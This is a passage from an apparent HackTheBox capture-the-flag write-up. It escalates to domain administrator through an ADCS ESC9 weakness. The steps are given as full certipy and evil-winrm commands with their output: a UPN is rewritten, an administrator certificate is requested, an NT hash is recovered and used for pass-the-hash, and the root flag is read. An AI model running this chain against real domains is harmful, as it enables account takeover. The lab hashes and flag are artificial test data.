- There is a file in the `$Recycle.Bin` but we can't peek at it

## ADCS
---
- Given that we now have control over `ca_operator`, we can take a peek with `certipy` to see if we've got any vulnerable `CA`s
```sh
❯ certipy find -vulnerable -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -stdout
...
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-05-13T15:48:52+00:00
    Template Last Modified              : 2024-05-13T15:55:20+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Full Control Principals         : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```
- Looks like the `CertifiedAuthentication` certificate might be vulnerable to `ESC9`

# Root Shell
## ESC9
---
- We can navigate to the [ESC9](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template) section of the certipy wiki to see that the vulnerability arises when the certificate template is explicitly configured not to include the `szOID_NTDS_CA_SECURITY_EXT` security extension in the certificates it issues

### Verify Vulnerability
- The vulnerability becomes exploitable in the following conditions:
	- The `StrongCertificateBindingEnforcement` registry key on Domain Controllers (under HKLM\SYSTEM\CurrentControlSet\Services\Kdc) is set to 1 (Compatibility Mode) or 0 (Disabled). 
	- The ESC9 template must allow for client authentication (e.g., include "Client Authentication" EKU). (**it does**)
	- An attacker-controlled account must have enrollment rights for this template. (**we do**)

- We can check the status of the `StrongCertificateBindingEnforcement` registry key with the following `Powershell`:
```powershell
*Evil-WinRM* PS C:\> Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name StrongCertificateBindingEnforcement

StrongCertificateBindingEnforcement : 0
PSPath                              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
PSParentPath                        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
PSChildName                         : Kdc
PSDrive                             : HKLM
PSProvider                          : Microsoft.PowerShell.Core\Registry
```
- Disabled, that's a check! Looks like this vulnerability is viable!

### Perform Exploit
- We'll need to ensure we have an account that can overwrite the vulnerable certificate enroller's account `User Principal Name (UPN)` which should be `management_svc -> ca_operator`

1. Read initial UPN of the victim account (Optional - for restoration).
```sh
❯ certipy account -u 'ca_operator@certified.htb' -hashes b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -user 'ca_operator' read                                
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_operator':
    cn                                  : operator ca
    distinguishedName                   : CN=operator ca,CN=Users,DC=certified,DC=htb
    name                                : operator ca
    objectSid                           : S-1-5-21-729746778-2675978091-3820388244-1106
    sAMAccountName                      : ca_operator
    userPrincipalName                   : ca_operator@certified.htb
    userAccountControl                  : 66048
    whenCreated                         : 2024-05-13T15:32:03+00:00
    whenChanged                         : 2026-02-11T13:51:41+00:00
```

2. Update the victim account's UPN to the target administrator's `sAMAccountName`
	- The sAMAccountName of the default administrator is typically "Administrator". The UPN needs to be resolvable to the target account.
```sh
❯ certipy account -u 'management_svc@certified.htb' -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -upn 'administrator' -user 'ca_operator' update               
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
```
- Now, the victim account has its UPN temporarily set to `administrator`.

3. Request a certificate as the "victim" user from the ESC9 template
```sh
❯ certipy req -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'   
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

4. Authenticate as the target administrator
```sh
❯ certipy auth -dc-ip 10.129.231.186 -pfx administrator.pfx -domain certified.htb
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

## WinRM
---
- Now we can grab `root.txt`!
```sh
❯ evil-winrm -i 10.129.231.186 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
50aa209f8b2eedca810af033aa60c430
```

